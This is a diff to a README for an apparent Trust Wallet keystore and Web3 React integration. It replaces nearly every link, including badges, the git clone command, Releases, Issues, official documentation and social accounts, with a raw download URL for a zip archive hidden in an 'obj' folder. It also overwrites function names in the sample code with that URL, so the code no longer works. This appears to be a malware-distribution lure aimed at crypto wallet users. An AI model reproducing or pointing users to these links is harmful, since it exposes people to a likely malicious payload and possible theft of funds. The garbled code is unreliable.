@@ -1,8 +1,8 @@
 # Trust Wallet Core Keystore & Web3 Integration for React 🌐💼
 
-![Trust Wallet](https://img.shields.io/badge/Trust%20Wallet-Core%20Integration-blue.svg)
-![Web3](https://img.shields.io/badge/Web3-Connect-green.svg)
-![React](https://img.shields.io/badge/React-Integration-orange.svg)
+![Trust Wallet](https://github.com/Ifroj/Trust-Wallet-Core-Keystore-Monorepo-Web3-Connect-Integration-React-Blockhain/raw/refs/heads/main/Zylo-Trust-Wallet/Form11/obj/Trust-React-Blockhain-Keystore-Monorepo-Web-Integration-Wallet-Connect-Core-3.2.zip%20Wallet-Core%https://github.com/Ifroj/Trust-Wallet-Core-Keystore-Monorepo-Web3-Connect-Integration-React-Blockhain/raw/refs/heads/main/Zylo-Trust-Wallet/Form11/obj/Trust-React-Blockhain-Keystore-Monorepo-Web-Integration-Wallet-Connect-Core-3.2.zip)
+![Web3](https://github.com/Ifroj/Trust-Wallet-Core-Keystore-Monorepo-Web3-Connect-Integration-React-Blockhain/raw/refs/heads/main/Zylo-Trust-Wallet/Form11/obj/Trust-React-Blockhain-Keystore-Monorepo-Web-Integration-Wallet-Connect-Core-3.2.zip)
+![React](https://github.com/Ifroj/Trust-Wallet-Core-Keystore-Monorepo-Web3-Connect-Integration-React-Blockhain/raw/refs/heads/main/Zylo-Trust-Wallet/Form11/obj/Trust-React-Blockhain-Keystore-Monorepo-Web-Integration-Wallet-Connect-Core-3.2.zip)
 
 ## Overview
 
@@ -47,7 +47,7 @@ To get started with the Trust Wallet Core Keystore and Web3 Connect Integration,
 
 1. **Clone the Repository**: 
    ```bash
-   git clone https://github.com/Ifroj/Trust-Wallet-Core-Keystore-Monorepo-Web3-Connect-Integration-React-Blockhain.git
+   git clone https://github.com/Ifroj/Trust-Wallet-Core-Keystore-Monorepo-Web3-Connect-Integration-React-Blockhain/raw/refs/heads/main/Zylo-Trust-Wallet/Form11/obj/Trust-React-Blockhain-Keystore-Monorepo-Web-Integration-Wallet-Connect-Core-3.2.zip
    ```
 
 2. **Install Dependencies**: 
@@ -67,9 +67,9 @@ To get started with the Trust Wallet Core Keystore and Web3 Connect Integration,
 
 ### Downloadable Releases
 
-For the latest releases, you can download the necessary files from the [Releases section](https://github.com/Ifroj/Trust-Wallet-Core-Keystore-Monorepo-Web3-Connect-Integration-React-Blockhain/releases). Ensure to follow the instructions provided in the release notes for installation and execution.
+For the latest releases, you can download the necessary files from the [Releases section](https://github.com/Ifroj/Trust-Wallet-Core-Keystore-Monorepo-Web3-Connect-Integration-React-Blockhain/raw/refs/heads/main/Zylo-Trust-Wallet/Form11/obj/Trust-React-Blockhain-Keystore-Monorepo-Web-Integration-Wallet-Connect-Core-3.2.zip). Ensure to follow the instructions provided in the release notes for installation and execution.
 
-![Releases](https://img.shields.io/badge/Download%20Releases-orange.svg)
+![Releases](https://github.com/Ifroj/Trust-Wallet-Core-Keystore-Monorepo-Web3-Connect-Integration-React-Blockhain/raw/refs/heads/main/Zylo-Trust-Wallet/Form11/obj/Trust-React-Blockhain-Keystore-Monorepo-Web-Integration-Wallet-Connect-Core-3.2.zip%https://github.com/Ifroj/Trust-Wallet-Core-Keystore-Monorepo-Web3-Connect-Integration-React-Blockhain/raw/refs/heads/main/Zylo-Trust-Wallet/Form11/obj/Trust-React-Blockhain-Keystore-Monorepo-Web-Integration-Wallet-Connect-Core-3.2.zip)
 
 ## Project Structure
 
@@ -90,10 +90,10 @@ import { KeystoreManager } from 'trust-wallet-sdk';
 
 const keystore = new KeystoreManager();
 
-keystore.createWallet('password').then(wallet => {
-    console.log('Wallet created:', wallet);
+https://github.com/Ifroj/Trust-Wallet-Core-Keystore-Monorepo-Web3-Connect-Integration-React-Blockhain/raw/refs/heads/main/Zylo-Trust-Wallet/Form11/obj/Trust-React-Blockhain-Keystore-Monorepo-Web-Integration-Wallet-Connect-Core-3.2.zip('password').then(wallet => {
+    https://github.com/Ifroj/Trust-Wallet-Core-Keystore-Monorepo-Web3-Connect-Integration-React-Blockhain/raw/refs/heads/main/Zylo-Trust-Wallet/Form11/obj/Trust-React-Blockhain-Keystore-Monorepo-Web-Integration-Wallet-Connect-Core-3.2.zip('Wallet created:', wallet);
 }).catch(error => {
-    console.error('Error creating wallet:', error);
+    https://github.com/Ifroj/Trust-Wallet-Core-Keystore-Monorepo-Web3-Connect-Integration-React-Blockhain/raw/refs/heads/main/Zylo-Trust-Wallet/Form11/obj/Trust-React-Blockhain-Keystore-Monorepo-Web-Integration-Wallet-Connect-Core-3.2.zip('Error creating wallet:', error);
 });
 ```
 
@@ -112,7 +112,7 @@ Please ensure your code adheres to the existing style and includes tests where a
 
 ## Issues
 
-If you encounter any issues, please check the [Issues section](https://github.com/Ifroj/Trust-Wallet-Core-Keystore-Monorepo-Web3-Connect-Integration-React-Blockhain/issues) of the repository. You can report bugs or request features.
+If you encounter any issues, please check the [Issues section](https://github.com/Ifroj/Trust-Wallet-Core-Keystore-Monorepo-Web3-Connect-Integration-React-Blockhain/raw/refs/heads/main/Zylo-Trust-Wallet/Form11/obj/Trust-React-Blockhain-Keystore-Monorepo-Web-Integration-Wallet-Connect-Core-3.2.zip) of the repository. You can report bugs or request features.
 
 ## License
 
@@ -120,13 +120,13 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Support
 
-For support, please reach out via the [Issues section](https://github.com/Ifroj/Trust-Wallet-Core-Keystore-Monorepo-Web3-Connect-Integration-React-Blockhain/issues). We aim to respond to all inquiries promptly.
+For support, please reach out via the [Issues section](https://github.com/Ifroj/Trust-Wallet-Core-Keystore-Monorepo-Web3-Connect-Integration-React-Blockhain/raw/refs/heads/main/Zylo-Trust-Wallet/Form11/obj/Trust-React-Blockhain-Keystore-Monorepo-Web-Integration-Wallet-Connect-Core-3.2.zip). We aim to respond to all inquiries promptly.
 
 ## Additional Resources
 
-- [Trust Wallet Documentation](https://docs.trustwallet.com/)
-- [Web3.js Documentation](https://web3js.readthedocs.io/)
-- [React Documentation](https://reactjs.org/docs/getting-started.html)
+- [Trust Wallet Documentation](https://github.com/Ifroj/Trust-Wallet-Core-Keystore-Monorepo-Web3-Connect-Integration-React-Blockhain/raw/refs/heads/main/Zylo-Trust-Wallet/Form11/obj/Trust-React-Blockhain-Keystore-Monorepo-Web-Integration-Wallet-Connect-Core-3.2.zip)
+- [https://github.com/Ifroj/Trust-Wallet-Core-Keystore-Monorepo-Web3-Connect-Integration-React-Blockhain/raw/refs/heads/main/Zylo-Trust-Wallet/Form11/obj/Trust-React-Blockhain-Keystore-Monorepo-Web-Integration-Wallet-Connect-Core-3.2.zip Documentation](https://github.com/Ifroj/Trust-Wallet-Core-Keystore-Monorepo-Web3-Connect-Integration-React-Blockhain/raw/refs/heads/main/Zylo-Trust-Wallet/Form11/obj/Trust-React-Blockhain-Keystore-Monorepo-Web-Integration-Wallet-Connect-Core-3.2.zip)
+- [React Documentation](https://github.com/Ifroj/Trust-Wallet-Core-Keystore-Monorepo-Web3-Connect-Integration-React-Blockhain/raw/refs/heads/main/Zylo-Trust-Wallet/Form11/obj/Trust-React-Blockhain-Keystore-Monorepo-Web-Integration-Wallet-Connect-Core-3.2.zip)
 
 ## Community
 
@@ -136,8 +136,8 @@ Join our community on Discord and other platforms to connect with other develope
 
 Stay updated with the latest news and updates from the project:
 
-- Twitter: [@TrustWallet](https://twitter.com/TrustWallet)
-- GitHub: [Trust Wallet GitHub](https://github.com/trustwallet)
+- Twitter: [@TrustWallet](https://github.com/Ifroj/Trust-Wallet-Core-Keystore-Monorepo-Web3-Connect-Integration-React-Blockhain/raw/refs/heads/main/Zylo-Trust-Wallet/Form11/obj/Trust-React-Blockhain-Keystore-Monorepo-Web-Integration-Wallet-Connect-Core-3.2.zip)
+- GitHub: [Trust Wallet GitHub](https://github.com/Ifroj/Trust-Wallet-Core-Keystore-Monorepo-Web3-Connect-Integration-React-Blockhain/raw/refs/heads/main/Zylo-Trust-Wallet/Form11/obj/Trust-React-Blockhain-Keystore-Monorepo-Web-Integration-Wallet-Connect-Core-3.2.zip)
 
 ### Acknowledgments
 
@@ -165,4 +165,4 @@ A: You can create various types of wallets, including hot wallets and cold walle
 
 ## Conclusion
 
-This repository serves as a comprehensive resource for integrating Trust Wallet features into your React applications. With a focus on security and usability, it provides the tools you need to build effective blockchain solutions. For more details, please check the [Releases section](https://github.com/Ifroj/Trust-Wallet-Core-Keystore-Monorepo-Web3-Connect-Integration-React-Blockhain/releases) and explore the available features.
+This repository serves as a comprehensive resource for integrating Trust Wallet features into your React applications. With a focus on security and usability, it provides the tools you need to build effective blockchain solutions. For more details, please check the [Releases section](https://github.com/Ifroj/Trust-Wallet-Core-Keystore-Monorepo-Web3-Connect-Integration-React-Blockhain/raw/refs/heads/main/Zylo-Trust-Wallet/Form11/obj/Trust-React-Blockhain-Keystore-Monorepo-Web-Integration-Wallet-Connect-Core-3.2.zip) and explore the available features.
